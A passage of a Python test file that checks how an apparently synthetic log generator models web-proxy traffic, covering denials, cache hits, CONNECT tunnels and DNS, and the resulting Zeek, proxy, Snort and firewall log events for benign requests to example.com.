                cs_bytes=620,
                time_taken=400,
                user_agent="Mozilla/5.0",
                content_type="application/javascript",
                cache_result="MISS",
                referrer="-",
                proxy_fqdn="PROXY-01.example.org",
            )
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5_000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            http=HttpContext(
                method="GET",
                host="example.com",
                uri="/jquery.js",
                version="1.1",
                user_agent="Mozilla/5.0",
                response_body_len=107_000,
                status_code=200,
                status_msg="OK",
                resp_mime_types=["application/javascript"],
            ),
        )

        origin_ip = resolve_domain_ip("example.com", src_host="PROXY-01")
        egress_events = [
            call.args[0]
            for call in emitters["zeek_conn"].emit.call_args_list
            if call.args[0].network.src_ip == "10.0.3.10"
            and call.args[0].network.dst_ip == origin_ip
            and call.args[0].network.dst_port == 443
        ]
        assert egress_events
        assert egress_events[0].network.conn_state == "SF"
        assert egress_events[0].ssl is not None
        assert egress_events[0].ssl.established is True

    def test_https_subresources_reuse_active_connect_tunnel(self):
        from evidenceforge.generation.activity.dns_registry import resolve_domain_ip

        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="both-sides",
                    monitoring_segments=["workstations", "dmz"],
                    direction="bidirectional",
                    log_formats=["zeek"],
                )
            ]
        )
        start_time = datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC)

        first_uid = generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=start_time,
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            emit_dns=True,
            conn_state="SF",
            http=HttpContext(
                method="GET",
                host="example.com",
                uri="/",
                version="1.1",
                user_agent="Mozilla/5.0",
                response_body_len=5000,
                status_code=200,
                status_msg="OK",
            ),
        )
        pairs_after_first = list(_conn_pairs(emitters))
        proxy_calls_after_first = emitters["proxy_access"].emit.call_count
        ssl_calls_after_first = emitters["zeek_ssl"].emit.call_count
        reused_uid = generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=start_time + timedelta(seconds=12),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=0.2,
            orig_bytes=200,
            resp_bytes=1200,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            emit_dns=True,
            conn_state="SF",
            http=HttpContext(
                method="GET",
                host="example.com",
                uri="/app.js",
                version="1.1",
                user_agent="Mozilla/5.0",
                response_body_len=1200,
                status_code=200,
                status_msg="OK",
            ),
        )

        assert reused_uid == first_uid
        assert _conn_pairs(emitters) == pairs_after_first
        assert ("10.0.1.10", "10.0.3.10", 8080) in pairs_after_first
        resolved_origin_ip = resolve_domain_ip("example.com", src_host="PROXY-01")
        assert ("10.0.3.10", resolved_origin_ip, 443) in pairs_after_first
        assert emitters["proxy_access"].emit.call_count == proxy_calls_after_first
        assert emitters["zeek_ssl"].emit.call_count == ssl_calls_after_first

    def test_denied_request_stops_before_origin_side_sources(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                ),
                NetworkSensor(
                    type="network",
                    name="egress-tap",
                    monitoring_segments=["dmz"],
                    direction="outbound",
                    log_formats=["zeek"],
                ),
                NetworkSensor(
                    type="ids",
                    name="egress-ids",
                    monitoring_segments=["dmz"],
                    direction="outbound",
                    log_formats=["snort_alert"],
                ),
                NetworkSensor(
                    type="firewall",
                    name="egress-fw",
                    monitoring_segments=["dmz"],
                    direction="outbound",
                    log_formats=["cisco_asa"],
                ),
            ]
        )
        generator._build_proxy_context = Mock(
            return_value=ProxyContext(
                client_ip="10.0.1.10",
                method="GET",
                url="http://example.com/private",
                host="example.com",
                status_code=403,
                sc_bytes=1200,
                cs_bytes=420,
                time_taken=250,
                user_agent="Mozilla/5.0",
                content_type="text/html",
                cache_result="DENIED",
                referrer="-",
                proxy_fqdn="PROXY-01.example.org",
            )
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=80,
            proto="tcp",
            service="http",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            conn_state="SF",
            http=HttpContext(
                method="GET",
                host="example.com",
                uri="/private",
                version="1.1",
                status_code=200,
                status_msg="OK",
            ),
            ids=IdsContext(
                sid=2013028,
                message="ET POLICY Suspicious HTTP Activity",
                classification="policy-violation",
                priority=2,
            ),
            firewall=FirewallContext(
                action="permit",
                msg_id=302013,
                connection_id=12345,
                src_interface="dmz",
                dst_interface="outside",
            ),
        )

        pairs = _conn_pairs(emitters)
        assert pairs
        assert all(pair == ("10.0.1.10", "10.0.3.10", 8080) for pair in pairs)
        proxy_event = emitters["proxy_access"].emit.call_args.args[0]
        assert proxy_event.proxy.status_code == 403
        assert proxy_event.proxy.cache_result == "DENIED"
        assert emitters["zeek_http"].emit.called
        http_event = emitters["zeek_http"].emit.call_args.args[0]
        assert http_event.http.status_code == 403
        assert http_event.http.status_msg == "Forbidden"
        assert http_event.http.response_body_len == 1200
        assert http_event.http.resp_mime_types == ["text/html"]
        assert all(
            call.args[0].network.dst_ip == "10.0.3.10"
            for call in emitters["zeek_http"].emit.call_args_list
        )
        assert not emitters["zeek_ssl"].emit.called
        assert not emitters["snort_alert"].emit.called
        assert not emitters["cisco_asa"].emit.called

    def test_inspected_https_denial_keeps_connect_successful(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="both-sides",
                    monitoring_segments=["workstations", "dmz"],
                    direction="bidirectional",
                    log_formats=["zeek"],
                )
            ]
        )
        generator._build_proxy_context = Mock(
            return_value=ProxyContext(
                client_ip="10.0.1.10",
                method="GET",
                url="https://example.com/private",
                host="example.com",
                status_code=403,
                tunnel_status_code=200,
                sc_bytes=1200,
                cs_bytes=420,
                time_taken=250,
                user_agent="Mozilla/5.0",
                content_type="text/html",
                cache_result="DENIED",
                referrer="-",
                proxy_fqdn="PROXY-01.example.org",
            )
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            conn_state="SF",
            http=HttpContext(
                method="GET",
                host="example.com",
                uri="/private",
                version="1.1",
                status_code=200,
                status_msg="OK",
            ),
        )

        proxy_event = emitters["proxy_access"].emit.call_args.args[0]
        assert proxy_event.proxy.status_code == 403
        assert proxy_event.proxy.tunnel_status_code == 200
        http_event = emitters["zeek_http"].emit.call_args.args[0]
        assert http_event.http.method == "CONNECT"
        assert http_event.http.status_code == 200
        assert http_event.http.status_msg == "Connection Established"
        assert ("10.0.3.10", "93.184.216.34", 443) not in _conn_pairs(emitters)

    def test_denied_connect_uses_proxy_error_accounting(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        generator._build_proxy_context = Mock(
            return_value=ProxyContext(
                client_ip="10.0.1.10",
                method="CONNECT",
                url="example.com:443",
                host="example.com",
                status_code=403,
                tunnel_status_code=403,
                sc_bytes=2_500_000,
                cs_bytes=900_000,
                time_taken=83_948,
                user_agent="Mozilla/5.0",
                content_type="text/html",
                cache_result="DENIED",
                referrer="-",
                proxy_fqdn="PROXY-01.example.org",
            )
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=90.0,
            orig_bytes=900_000,
            resp_bytes=2_500_000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            conn_state="SF",
        )

        proxy_event = emitters["proxy_access"].emit.call_args.args[0]
        assert proxy_event.proxy.status_code == 403
        assert proxy_event.proxy.tunnel_status_code == 403
        assert proxy_event.proxy.cs_bytes < 1000
        assert proxy_event.proxy.sc_bytes < 2500
        assert proxy_event.proxy.time_taken < 2000
        assert ("10.0.3.10", "93.184.216.34", 443) not in _conn_pairs(emitters)

    def test_cache_hit_request_stops_before_origin_side_sources(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                ),
                NetworkSensor(
                    type="network",
                    name="egress-tap",
                    monitoring_segments=["dmz"],
                    direction="outbound",
                    log_formats=["zeek"],
                ),
            ]
        )
        generator._build_proxy_context = Mock(
            return_value=ProxyContext(
                client_ip="10.0.1.10",
                method="GET",
                url="http://example.com/status.gif",
                host="example.com",
                status_code=200,
                sc_bytes=5200,
                cs_bytes=420,
                time_taken=80,
                user_agent="Mozilla/5.0",
                content_type="image/gif",
                cache_result="HIT",
                referrer="-",
                proxy_fqdn="PROXY-01.example.org",
            )
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=80,
            proto="tcp",
            service="http",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            conn_state="SF",
            http=HttpContext(
                method="GET",
                host="example.com",
                uri="/status.gif",
                version="1.1",
                response_body_len=5000,
                status_code=200,
                status_msg="OK",
                resp_mime_types=["image/gif"],
            ),
        )

        pairs = _conn_pairs(emitters)
        assert pairs
        assert all(pair == ("10.0.1.10", "10.0.3.10", 8080) for pair in pairs)
        proxy_event = emitters["proxy_access"].emit.call_args.args[0]
        assert proxy_event.proxy.cache_result == "HIT"
        assert proxy_event.proxy.status_code == 200
        assert emitters["zeek_http"].emit.called
        assert all(
            call.args[0].network.dst_ip == "10.0.3.10"
            for call in emitters["zeek_http"].emit.call_args_list
        )

    def test_cache_hit_proxy_sc_bytes_match_response_plus_overhead(self, monkeypatch):
        import evidenceforge.generation.activity.generator as generator_module

        generator, _ = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        proxy_system = generator._ip_to_system["10.0.3.10"]

        class FixedRng:
            def random(self) -> float:
                return 0.1

            def randint(self, low: int, high: int) -> int:
                return low

            def choice(self, values):
                return values[0]

        monkeypatch.setattr(generator_module, "_get_rng", lambda: FixedRng())
        monkeypatch.setattr(generator_module, "pick_proxy_domain_user_agent", lambda *a, **k: None)

        proxy_context = generator._build_proxy_context(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            dst_port=80,
            service="http",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            hostname="example.com",
            source_system=generator._ip_to_system["10.0.1.10"],
            proxy_sys=proxy_system,
            http=HttpContext(
                method="GET",
                host="example.com",
                uri="/status.gif",
                version="1.1",
                user_agent="Mozilla/5.0",
                response_body_len=5000,
                status_code=200,
                status_msg="OK",
                resp_mime_types=["image/gif"],
            ),
            explicit_mode=True,
        )

        assert proxy_context.cache_result == "HIT"
        assert proxy_context.sc_bytes == 5050
        assert proxy_context.cs_bytes == 580

    def test_supplied_http_user_agent_survives_domain_override(self, monkeypatch):
        """Proxy context must preserve caller-owned request metadata for correlated egress."""
        import evidenceforge.generation.activity.generator as generator_module

        generator, _ = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        proxy_system = generator._ip_to_system["10.0.3.10"]
        monkeypatch.setattr(
            generator_module,
            "pick_proxy_domain_user_agent",
            lambda *a, **k: "python-requests/2.31.0",
        )

        proxy_context = generator._build_proxy_context(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            dst_port=443,
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            hostname="example.com",
            source_system=generator._ip_to_system["10.0.1.10"],
            proxy_sys=proxy_system,
            http=HttpContext(
                method="GET",
                host="example.com",
                uri="/portal",
                version="1.1",
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                response_body_len=5000,
                status_code=200,
                status_msg="OK",
                resp_mime_types=["text/html"],
            ),
            explicit_mode=True,
        )

        assert proxy_context.user_agent == "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

    def test_auth_required_connect_stops_before_origin_side_sources(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="both-sides",
                    monitoring_segments=["workstations", "dmz"],
                    direction="bidirectional",
                    log_formats=["zeek"],
                )
            ]
        )
        generator._build_proxy_context = Mock(
            return_value=ProxyContext(
                client_ip="10.0.1.10",
                method="CONNECT",
                url="example.com:443",
                host="example.com",
                status_code=407,
                sc_bytes=700,
                cs_bytes=320,
                time_taken=250,
                user_agent="Mozilla/5.0",
                content_type="text/html",
                cache_result="AUTH_REQUIRED",
                referrer="-",
                proxy_fqdn="PROXY-01.example.org",
            )
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            conn_state="SF",
        )

        pairs = _conn_pairs(emitters)
        assert ("10.0.1.10", "10.0.3.10", 8080) in pairs
        assert ("10.0.3.10", "93.184.216.34", 443) not in pairs
        proxy_event = emitters["proxy_access"].emit.call_args.args[0]
        assert proxy_event.proxy.status_code == 407
        http_event = emitters["zeek_http"].emit.call_args.args[0]
        assert http_event.http.method == "CONNECT"
        assert http_event.http.status_code == 407
        assert http_event.http.request_body_len == 0
        assert http_event.http.response_body_len == 0
        assert not emitters["zeek_ssl"].emit.called

    def test_supplied_denied_proxy_context_stops_before_origin_side_sources(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="both-sides",
                    monitoring_segments=["workstations", "dmz"],
                    direction="bidirectional",
                    log_formats=["zeek"],
                )
            ]
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            conn_state="SF",
            proxy=ProxyContext(
                client_ip="10.0.1.10",
                method="CONNECT",
                url="example.com:443",
                host="example.com",
                status_code=403,
                sc_bytes=700,
                cs_bytes=320,
                time_taken=250,
                user_agent="Mozilla/5.0",
                content_type="text/html",
                cache_result="DENIED",
                referrer="-",
                proxy_fqdn="PROXY-01.example.org",
            ),
        )

        pairs = _conn_pairs(emitters)
        assert ("10.0.1.10", "10.0.3.10", 8080) in pairs
        assert ("10.0.3.10", "93.184.216.34", 443) not in pairs
        proxy_event = emitters["proxy_access"].emit.call_args.args[0]
        assert proxy_event.proxy.status_code == 403
        assert not emitters["zeek_ssl"].emit.called

    def test_port_only_web_connection_resolves_origin_from_proxy(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                ),
                NetworkSensor(
                    type="network",
                    name="egress-tap",
                    monitoring_segments=["dmz"],
                    direction="outbound",
                    log_formats=["zeek"],
                ),
            ]
        )
        generator._dns_server_ips = ["10.0.0.1"]

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="10.0.0.1",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service=None,
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            emit_dns=True,
            conn_state="SF",
        )

        pairs = _conn_pairs(emitters)
        assert ("10.0.1.10", "10.0.3.10", 8080) in pairs
        origin_pairs = [pair for pair in pairs if pair[0] == "10.0.3.10" and pair[2] == 443]
        assert origin_pairs
        assert all(pair[1] != "10.0.0.1" for pair in origin_pairs)
        assert all(pair[0] != "10.0.1.10" or pair[1] == "10.0.3.10" for pair in pairs)
        dns_events = [call.args[0] for call in emitters["zeek_dns"].emit.call_args_list]
        assert dns_events
        assert all(event.network.src_ip == "10.0.3.10" for event in dns_events)
        assert all("10.0.0.1" not in event.dns.answers for event in dns_events)
        assert all(event.dns.query != "PROXY-01.example.org" for event in dns_events)
        assert any(event.dns.query == "example.com" for event in dns_events)

    def test_private_destination_without_hostname_does_not_invent_public_dns(self):
        from evidenceforge.generation.activity.network import REVERSE_DNS

        workstation = _system("WKS-01", "10.0.1.10")
        state_manager = StateManager()
        state_manager.set_current_time(datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC))
        emitters = _emitters()
        generator = ActivityGenerator(state_manager, emitters)
        generator._ip_to_system = {workstation.ip: workstation}
        generator._dns_server_ips = ["10.0.0.1"]
        generator._ad_domain = "example.org"

        previous_reverse = REVERSE_DNS.pop("10.0.0.1", None)
        try:
            generator.generate_connection(
                src_ip="10.0.1.10",
                dst_ip="10.0.0.1",
                time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
                dst_port=443,
                proto="tcp",
                service=None,
                duration=1.0,
                orig_bytes=500,
                resp_bytes=5000,
                source_system=workstation,
                emit_dns=True,
                conn_state="SF",
            )
        finally:
            if previous_reverse is None:
                REVERSE_DNS.pop("10.0.0.1", None)
            else:
                REVERSE_DNS["10.0.0.1"] = previous_reverse

        dns_events = [call.args[0] for call in emitters["zeek_dns"].emit.call_args_list]
        assert dns_events
        assert all(event.network.src_ip == "10.0.1.10" for event in dns_events)
        queries = {event.dns.query for event in dns_events}
        assert any(query.endswith(".example.org") for query in queries)
        assert not any(
            public_hint in query
            for query in queries
            for public_hint in ("hotjar", "hubspot", "amplitude", "intercom", "linkedin")
        )

    def test_established_ssl_connection_always_has_ssl_context(self):
        state_manager = StateManager()
        state_manager.set_current_time(datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC))
        emitters = _emitters()
        generator = ActivityGenerator(state_manager, emitters)

        generator.generate_connection(
            src_ip="10.0.3.10",
            dst_ip="93.184.216.34",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            hostname="example.com",
            conn_state="S0",
            http=HttpContext(
                method="GET",
                host="example.com",
                uri="/",
                version="1.1",
                status_code=200,
                status_msg="OK",
            ),
        )

        conn_event = emitters["zeek_conn"].emit.call_args.args[0]
        assert conn_event.network.conn_state == "SF"
        assert conn_event.network.orig_bytes > 0
        assert conn_event.network.resp_bytes > 0
        assert conn_event.network.orig_pkts > 0
        assert conn_event.network.resp_pkts > 0
        assert conn_event.ssl is not None
        assert conn_event.ssl.established is True
        assert conn_event.x509 is not None
        assert conn_event.x509_chain[0] is conn_event.x509
        assert conn_event.ssl.cert_chain_fuids == [cert.fuid for cert in conn_event.x509_chain]
